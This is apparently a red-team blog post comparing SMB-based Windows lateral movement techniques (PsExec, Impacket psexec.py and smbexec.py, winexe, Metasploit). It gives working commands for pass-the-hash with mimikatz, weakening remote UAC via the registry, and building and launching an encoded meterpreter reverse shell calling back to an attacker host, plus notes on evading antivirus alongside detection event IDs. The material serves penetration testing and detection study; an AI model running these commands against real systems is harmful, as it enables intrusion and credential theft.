---
layout: posts
title: "Windows Lateral Movement with smb, psexec and alternatives"
categories:
  - Windows
tags:
  - lateral movement
  - smb
  - psexec
  - impacket
  - winexe
  - smbexec
date: 2020-09-08
---

# Scope
During a red team engangement there are several choices for lateral movement, whether you have credentials or hashes. Each choice has different configuration requirements in order to work, while it leaves different fingerprints on the remote machine.  
This post is about summarizing some of these lateral movement techniques based on SMB and checking the differences between them.  
In a later post I ll try to summarize more lateral movement techniques like WinRM, WMI, PSRemote, RDP Hijacking and their alternatives with C# tools.

# SMB-(PsExec,Smbexec,winexe)
## Preamble
+ In general, we execute remote commands (like powershell, vssadmin) over SMB using named pipes. 
+ These tools leave behind a service binary and they are logged as a `Windows Event #5145`.  
+ In short, the key facts are:  
 ~~~
 PORTS Used: TCP 445(SMB), 135(RPC)
 AUTH:       Local Administrator Access
 Tools:      winexe, psexec (sysinternals, impacket), smbexec,...
 Signatures: Service binaries left behind, Windows Event #5145
 ~~~

+ All techniques that use SMB/RPC protocols for lateral movement need to have **admin shares enabled**. This is enabled by default in a windows domain environment but in order to test them on a non-domain machine we need to enable the Default Admin Shares (`C$, ADMIN$`). This includes the following:
  - Enable Administrator account and set a password
  - Open relevant ports on Windows Firewall. For a complete how to check: [Enable Deafult Admin Shares](https://www.repairwin.com/enable-admin-shares-windows-10-8-7), but **in brief**:    
    * The easiest way is to enable File and Printer Sharing checkbox on the menu `Allow an app through Windows Firewall` from within `System and Security Settings`  
      From cmd:
      ```
      netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
      ```
     * In case the attacker machine is in a different subnet from the target machine, the scope of the above setting sould be changed. In advanced firewall settings `File and Printer Sharing (NB-Session-In)` and `File and Printer Sharing(SMB-IN)` scope sould be `any` instead of `local subnet`.

  - Disable the `LocalAccountTokenFilterPolicy` in registry (`value=0x1`) appropriately.  
    ```
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
    ```
    * **Note** on `LocalAccountTokenFilterPolicy`
      + After Windows Vista, any remote connection (wmi, psexec, etc) with any non-RID 500 local admin account (local to the remote machine account), returns a token that is "filtered", which means `medium integrity` even if the user is a local administrator to the remote machine.
      + So, when the user attempts to access privileged resource remotely (e.g. `ADMIN$`), he gets an `Access Denied` message, despite having administrative access to the remote machine as a local user.
      + In other words:  
        > When a user who is a member of the local administrators group on the target remote computer establishes a remote administrative connection…they will not connect as a full administrator. The user has no elevation potential on the remote computer, and the user cannot perform administrative tasks. If the user wants to administer the workstation with a Security Account Manager (SAM) account, the user must interactively log on to the computer that is to be administered with Remote Assistance or Remote Desktop.
      + This behaviour depends on the `LocalAccountFilterPolicy`. By disabling it, a user, who is member of the local administrators group on the target remote computer, will get a `high integrity` access token. So, in this case, psexec, wmi etc will work.
      + The above **does not** apply with the default local administrator account (RID 500). This account is not being affected by the `LocalAccountFilterPolicy`, so it will always get a high integrity token. By default this account is disabled in windows but in some corporate environments it might be enabled.
      + On the other hand:
        >When a user with a domain user account logs on to a Windows Vista computer remotely, and the user is a member of the Administrators group, the domain user will run with a full administrator access token on the remote computer and UAC is disabled for the user on the remote computer for that session.
      + The above explains why in a domain environment a domain user that has local administrative privileges on a remote machine can use psexec for lateral movement (has high integrity token on remote connection)
      + For more details: [posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167)


+ Having enabled the default Admin shares on a single machine we can proceed to check the various techniques as following:

---

## Sysinternals PsExec
  + PsExec is part of the [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
  + The way it works is as following:
    - Connects to `ADMIN$=C:\Windows` share folder and uploads a `PSEXECSVC.exe` file. 
    - Then uses Service Control Manager (sc) to start the service binary (service name `PsExecSVC`)
    - Creates a named pipe on the destination host and uses it for input/output operations.  
      
      ![psexec-netflow](/assets/psexec-netflow.png)  

    - Executes the program under a parent process of psexecsvc.exe. Parent process of psexecsvc.exe is `services.exe`  
      
      ![psexecsvc-image](/assets/2020-07-20-psexecsvc.png)                                                              

    - Upon completion of its task, the PsExecSVC Windows service will be stopped and the `PSEXESVC.exe` file will be deleted from `ADMIN$`.
  
### Usage Examples:
  - Semi interactive shell with admin credentials:  
    ```powershell
    psexec.exe /accepteula \\192.168.1.2 -u LAB\admin -p password cmd.exe`
    ```
  - Semi interactive shell with NTLM hashes.  
    By default, **PsExec does not pass the hash** by itself.  
    However we can use Windows Credential Editor or **Mimikatz** for pass-the-hash and then utilize psexec.
    ```powershell
    # Get ntlm hashes with mimikatz
    privilege::logonpasswords
    # Spawn a new cmd as a different user using Mimikatz:
     sekurlsa::pth /user:user1 /domain:WORKGROUP /ntlm:217e50203a5aba59cefa863c724bf61b
    # Psexec
    PsExec.exe /accepteula \\192.168.1.2 cmd.exe
    ```

### Detection on Target Machine
  - Since `psexecsvc.exe` is uploaded to target's network share (`ADMIN$`) a windows event log id `5145` (network share was checked for access) will be logged.
  - Event id `7045` for initial service installation will also be logged.
  - Furthermore the existance of file `psexecsvc.exe` is an indication that psexec has been used to access target machine.

### Detection on Source host
  - A registry value is created when PsExec License Agreement has been agreed to.
  - Execution history (prefetch)

---

## Impacket PsExec.py
  + [Impacket Collection](https://github.com/SecureAuthCorp/impacket) is a well-known collection of Python classes for working with network protocols.
  + Impacket PsExec works similar to to sysinternals psexec.
  + Needs admin rights on target machine
  + Port used: 445
  + Instead of uploading psexeccsv service binary, it uploads to `ADMIN$` a service binary with an arbitrary name. It may be flagged and stopped by AV, EDR
  + Interactive binaries like (powershell, vssadmin, plink...) will cause the service to fail
  ```sh
  #Using credentials
  psexec.py user1:"password"@172.16.50.42 cmd.exe
  #Using hashes
  psexec.py -hashes :217e50203a5aba59cefa863c724bf61b user1@172.16.50.42 cmd.exe
  ```

## PsExec-like without psexec (Using SC like psexec but in a manual way)
  + Requirements:
    - Port 139,445 open on the remote machine (smb)
    - Password or NTLM hash
    - Write permissions on a network shared folder. Doesn't matter which one.  
      NOTE: `NTFS permissions != Share Permissons`. So, permission to write locally is not enough
    - Permissions to create services on the remote machine: `SC_MANAGER_CREATE_SERVICE`-(Access mask: 0x0002)
    - Ability to start the service created:   
      `SERVICE_QUERY_STATUS (Access mask: 0x0004) + SERVICE_START (Access mask: 0x0010)`
  + The last 2 requirements above are granted to administrators. So an unpriviliged user does not comply with them.
  + For more details check [Lateral Movement- A deep look into psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)

  + Example
    ```sh
    # Create an exe as a service
    msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.16.50.48 LPORT=8080 -f exe-service --platform windows -e x64/xor_dynamic  -o meter64_service.exe
    # List Shares
    smbclient -L 172.16.50.42 -U user1
    ```
    ![List Shares](/assets/smbclient_list_shares.png)
    ```sh 
    # Upload the exe to windows machine
    smbclient \\\\172.16.50.42\\smbshare -U user1 -c "put meter64_service.exe test.exe"
    # Using impacket services.py create service remotely
    services.py WORKGROUP/user1@172.16.50.42 create -name testing -display testing1 -path "\\\\172.16.50.42\\smbshare\\test.exe"
    ```
    ![Create Service](/assets/impacket_create_service.png)
    ```sh
    # Using impacket services.py start the service and get the meterpreter shell
    services.py WORKGROUP/user1@172.16.50.42 start -name testing
    ```
    ![PoC](/assets/meter_session.png)

---

## Impacket smbexec.py
  + Part of the [Impacket Collection](https://github.com/SecureAuthCorp/impacket). It does not upload a service binary to target.
  + By default it creates a service with the name "BTOBTO". Of course the name can be changed in `smbexec.py` under the variable `SERVICE_NAME=...`, or can be given as a command line parameter to `smbexec.py`.
  + For every command given:
    - Transfers commands for the attacker's machine to the target machine via SMB as a bat file in `%TEMP%/execute.bat`
    - A new service named "BTOBO" is created which does the following and then exits.
    - It echoes the command to be executed in a `bat` script, and redirects to stdout and stderror to a Temp file, then runs the bat script then deletes it.
    - Makes a call to an existing binary that already lives on the endpoint to execute commands, cmd.exe
    - It is actually a pseudo shell (**Non-interactive Shell**)
    - ![smbexec.py service creation](/assets/smbexec_service_creation.png)
  + Keep in mind that it does not drop any binary on the host (stealthier than psexec.py).
    - `%COMSPEC%` is an environmental variable. `ComSpec=C:\WINDOWS\system32\cmd.exe`
  + Info was extracted from: 
    - [book.hacktricks.xyz](https://book.hacktricks.xyz/windows/ntlm/smbexec)
    - [Varonis - Stealthy password hacking with smbexec](https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/)
  + Tested on systems with different AVs enabled without being blocked where `impacket psexec.py` was blocked.
---

## Winexe Statically Compiled / Kali Winexe
  + It is the equivelant to psexec for linux
  + The version installed in Kali (`apt install winexe`) does not support smb v2, so it fails to execute in current verions of windows where smb v1 is depreciated.
  + Instructions for building a winexe version that supports smb v2 can be found below:
    - <https://community.opmantek.com/display/OA/Auditing+Windows+machines+from+Linux+using+SMB2>
    - <http://dl-openaudit.opmantek.com/winexe-static>
    - <https://whiteoaksecurity.com/blog/2019/10/15/tales-from-the-red-team-building-winexe>
    - <https://bitbucket.org/reevertcode/reevert-winexe-waf/src/master/>
  + Connects to `ADMIN$=C:\Windows` share folder and uploads a `winexesvc.exe` file. 
    - Then uses Service Control Manager (sc) to start the service binary (service name `winexesvc`)
    - Creates a named pipe on the destination host and uses it for input/output operations.
    - It does not stop the service on exit and it does not delete the file in `c:\windows`
  + Tested on different AVs without being blocked. 
---


## Metasploit PsExec  
  + Same behaviour to sysinternals but when sc starts the service, it starts a new rundll32.exe process, allocates executable memory in the process and copies shellcode into it.  
    + <https://blog.rapid7.com/2013/03/09/psexec-demystified/>
  + Modules in metasploit:
    <pre>
    exploit/windows/smb/psexec
    exploit/windows/local/current_user_psexec
    auxiliary/admin/smb/psexec_command
    auxiliary/scanner/smb/psexec_loggedin_users
    </pre>
  + Service binaries for Metasploit PsExec are flaggged by AV

---

## PSexec Alternatives
+ CSExec - A C Sharp psexec implementation  
  - <https://github.com/malcomvetter/CSExec>
+ PAExec
  - <https://www.poweradmin.com/paexec/>
  - <https://github.com/poweradminllc/PAExec>

# References
  + <https://labs.f-secure.com/blog/attack-detection-fundamentals-discovery-and-lateral-movement-lab-4>
  + <https://adamtheautomator.com/psexec-ultimate-guide/>
  + <https://jpcertcc.github.io/ToolAnalysisResultSheet/>
  + <https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec>
  + <https://book.hacktricks.xyz/windows/ntlm/smbexec>
  + <https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/>
